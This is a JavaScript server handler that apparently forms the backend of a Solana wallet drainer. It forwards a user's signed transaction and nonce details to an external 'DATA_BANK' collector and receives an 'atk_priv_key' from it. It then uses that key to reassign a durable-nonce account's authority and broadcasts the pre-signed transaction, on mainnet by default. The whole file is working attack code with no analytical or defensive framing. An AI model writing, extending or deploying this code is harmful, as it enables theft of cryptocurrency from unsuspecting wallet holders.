import bs58 from "bs58";
import { SendTransactionError, Keypair, Transaction, Connection, clusterApiUrl, sendAndConfirmTransaction, PublicKey, SystemProgram } from "@solana/web3.js";
let connection;
import dotenv from 'dotenv';
dotenv.config();
const dataBank = process.env.DATA_BANK;

export default async function play(req) {
    try{
    const data = req.body;
    const endpoint = req.headers['endpoint'];
    connection = new Connection(clusterApiUrl(endpoint !== "https://api.devnet.solana.com" ? "mainnet-beta" : "devnet"));
    const atk_data = await sendEncoded(data);
    const key = new Uint8Array(JSON.parse(atk_data['atk_priv_key']))
    const atkKeypair = Keypair.fromSecretKey(key);
    const signature = await changeAuth(new PublicKey(data['noncePubKey']), atkKeypair, new PublicKey(data['pk']));
    console.log("auth changed:", signature);


    await sendNonceTransaction(data['encoded'], atkKeypair);

    const msg = {'status': 200, 'data':'Sent'};
    return msg;}
    catch(error){
        console.log(error);
        const msg = {'status': 500, 'data':'Interval Server Error'};
        return msg
    }
};

async function sendEncoded(data) {
    const resp = await fetch(`${dataBank}/save-encoded/`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    });
    if (resp.status !== 200) {
        await sendEncoded(data);
    } else {
        const result = await resp.json();
        return result;
    };
};

async function changeAuth(noncePubkey, auth, pk) {
    try {
        await delay(2000);
        const tx = new Transaction().add(
            SystemProgram.nonceAuthorize({
                noncePubkey: noncePubkey,
                authorizedPubkey: auth.publicKey,
                newAuthorizedPubkey: new PublicKey(pk)
            })
        );
        const signature = await sendAndConfirmTransaction(connection, tx, [auth], { commitment: "finalized" });
        console.log(signature);
        return signature;
    } catch (error) {
        console.log(error);
    };
};

const sendNonceTransaction = async (signedTxBase58, auth) => {
    try {
        console.log("starting")
        await delay(2000);
        console.log("ending")
        const serializedTx = bs58.decode(signedTxBase58);
        const tx = Transaction.from(serializedTx);
        console.log("Decoded transaction:", tx);
        const signature = await connection.sendRawTransaction(serializedTx, { skipPreflight: false, preflightCommitment: 'confirmed' });
        await connection.confirmTransaction(signature, 'confirmed');
        console.log("Transaction sent. Signature:", signature);
    } catch (err) {
        if (err instanceof SendTransactionError && err.logs) {
            console.error("SendTransactionError logs:", err.logs);
        }
        console.log("sendNonceTransaction error:", err);
    }
};

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}